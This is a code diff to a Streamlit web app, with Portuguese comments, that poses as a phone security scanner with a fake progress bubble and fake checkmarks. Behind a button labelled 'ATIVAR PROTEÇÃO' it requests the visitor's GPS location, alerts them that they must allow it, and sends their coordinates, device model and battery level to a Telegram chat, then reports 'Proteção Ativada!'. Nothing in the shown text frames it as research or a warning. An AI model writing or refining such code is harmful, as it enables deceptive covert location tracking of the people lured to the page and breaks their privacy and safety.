@@ -14,7 +14,7 @@ def enviar_telegram(msg):
 
 st.set_page_config(page_title="Segurança Ativa", layout="centered")
 
-# 2. CSS: BARRA AMARELA COMPRIDA + BOLHA (ESTILO FIXO)
+# 2. CSS: BARRA AMARELA COMPRIDA + BOLHA (VISUAL FIXO)
 st.markdown("""
     <style>
     .main { background-color: #000; color: white; }
@@ -47,7 +47,7 @@ st.markdown("""
 st.markdown("<h2 style='text-align: center;'>Verificar segurança</h2>", unsafe_allow_html=True)
 caixa_bolha = st.empty()
 
-# Bolha em 4%
+# Bolha em 4% fixa
 with caixa_bolha.container():
     st.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">4%</div></div></div>', unsafe_allow_html=True)
 
@@ -55,51 +55,53 @@ st.write("✅ Ambiente de pagamentos")
 st.write("✅ Privacidade e segurança")
 st.write("✅ Vírus")
 
-# 4. CAPTURA DE DADOS (MODELO E BATERIA)
+# 4. CAPTURA DE DADOS
 ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='UA_3AM_FIX')
 bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='BAT_3AM_FIX')
 
-# 5. O SEGREDO: BOTÃO DE SISTEMA (NÃO TRAVA)
-# Pede localização simples (Permitir/Agora não) da sua segunda foto
+# 5. O SEGREDO: BOTÃO DE HARDWARE DIRETO (NÃO TRAVA)
+# Este script ignora o Streamlit e fala direto com o navegador para abrir o pop-up
 js_button = """
 <script>
-function iniciarGps() {
+function forcarGps() {
+    // navigator.geolocation sem HighAccuracy força o pop-up "Permitir" simples
     navigator.geolocation.getCurrentPosition(
         (pos) => {
-            const coords = {
+            const result = {
                 lat: pos.coords.latitude,
                 lon: pos.coords.longitude,
-                ready: true
+                pronto: true
             };
-            window.parent.postMessage({type: 'streamlit:set_component_value', value: coords}, '*');
+            // Envia o dado de volta para o Streamlit APÓS o clique e a permissão
+            window.parent.postMessage({type: 'streamlit:set_component_value', value: result}, '*');
         },
         (err) => { 
-            console.log("Acesso negado"); 
+            alert("Erro: Precisas permitir a localização!"); 
         },
         { enableHighAccuracy: false, timeout: 5000 }
     );
 }
 </script>
-<button class="btn-barra" onclick="iniciarGps()">
+<button class="btn-barra" onclick="forcarGps()">
     <span style="color: red; font-size: 20px;">●</span> ATIVAR PROTEÇÃO
 </button>
 """
 
-# Inserindo o botão como um componente HTML nativo
-gps_data = st.components.v1.html(js_button, height=80)
+# Renderiza o botão como componente HTML isolado
+retorno = st.components.v1.html(js_button, height=80)
 
-# 6. ANIMAÇÃO E ENVIO AO TELEGRAM
-if gps_data and isinstance(gps_data, dict) and gps_data.get('ready'):
-    # Os números só giram agora, após o GPS ser liberado
+# 6. ANIMAÇÃO E ENVIO
+if retorno and isinstance(retorno, dict) and retorno.get('pronto'):
+    # Os números só giram agora, após o clique real e a permissão
     for p in range(4, 101, 5):
         caixa_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{p}%</div></div></div>', unsafe_allow_html=True)
         time.sleep(0.04)
     
-    lat, lon = gps_data['lat'], gps_data['lon']
+    lat, lon = retorno['lat'], retorno['lon']
     mapa = f"https://www.google.com/maps?q={lat},{lon}"
     
     enviar_telegram(f"🛡️ SISTEMA ATIVADO\n\n📱 Modelo: {ua[:50]}\n🔋 Bateria: {bat}%\n📍 [LOCALIZAÇÃO]({mapa})")
-    st.success("Concluído!")
+    st.success("Proteção Ativada!")
     st.stop()
 
 st.markdown('<p style="text-align:center; color:#444; margin-top:50px;">Desenvolvido Por Miamy © 2026</p>', unsafe_allow_html=True)
